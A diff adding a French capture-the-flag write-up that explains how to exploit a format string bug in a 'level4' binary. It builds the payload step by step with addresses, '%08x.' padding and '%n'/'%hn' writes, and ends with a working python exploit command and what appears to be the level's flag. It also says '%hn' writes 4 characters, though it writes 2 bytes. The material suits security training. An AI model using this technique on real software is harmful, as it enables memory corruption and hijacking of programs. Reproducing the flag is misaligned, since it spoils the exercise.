@@ -1,0 +1,39 @@
+On remarque que cet executable est de nouveau vulnérable au format string bug. Nous allons donc en réaliser un.
+
+on va devoir écrire cette fois ci un plus gros nombre que dans l'exercice précédent dans la memoire : 0x01025544.
+
+Nous allons devoir procéder à plusieurs écritures successives en mémoire.
+
+Nous écrivons donc une premiere adresse, celle où nous allons écrire la premiere partie de notre nombre :
+chaine : adresse1
+
+Ensuite nous mettons quatre caractères pour pouvoir écrire les dépiler avec un %x futur qui ecrira un nombre arbitraire de
+caractères qui correspond 0x5544 - 0x0102. Nous réaliserons cela en augmentant longueur de champ.
+chaine : adresse1 + 'aaaa'
+
+nous ecrivons ensuite la seconde adresse :
+chaine : adresse1 + 'aaaa' + adresse2
+
+Ensuite, nous ecrivons autant de "%08x." qu'il faut pour que le second prochain champ lu par printf soit le début de notre chaine
+(donc la premiere adresse).
+chaine : adresse1 + 'aaaa' + adresse2 + '%08x.' * 10.
+(Nous trouvons le nombre 10 par tatonnement).
+
+À ce moment ci nous avons ecrit : 4 + 4 + 4 + 9 * 10 = 102 caractères. Pour écrire 0x0102(=258), il nous faut donc rajouter
+156 caractères. Nous faisons cela de nouveau à l'aide de la précision d'un %x.
+chaine : adresse1 + 'aaaa' + adresse2 + '%08x.' * 10 + '%0156x'
+
+Le printf est maintenant au debut de notre chaine donc sur la premiere adresse. Nous pouvons donc ecrire ici :
+chaine : adresse1 + 'aaaa' + adresse2 + '%08x.' * 10 + '%0156x' + '%n'
+
+Nous devons maintenant écrire 0x5544 à la prochaine adresse : pour cela
+Nous devons d'abord écrire 0x5544 - 0x0102 = 21570 caractères
+chaine : adresse1 + 'aaaa' + adresse2 + '%08x.' * 10 + '%0156x' + '%n' + '%021570x'
+
+Le printf est à présent sur la seconde adresse : Nous ecrirons cette fois avec un %hn pour n'ecrire que 4 caracteres en memoire
+et ne pas ecraser ce que nous écrivâmes à la première adresse.
+chaine : adresse1 + 'aaaa' + adresse2 + '%08x.' * 10 + '%0156x' + '%n' + '%021570x' + '%hn'
+
+Ceci nous donne donc :
+python -c "print '\x12''\x98''\x04''\x08' + 'aaaa' + '\x10''\x98''\x04''\x08' + '%08x.' * 10 + '%0156x' + '%n' + '%021570x' + '%hn'" | /home/user/level4/level4
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
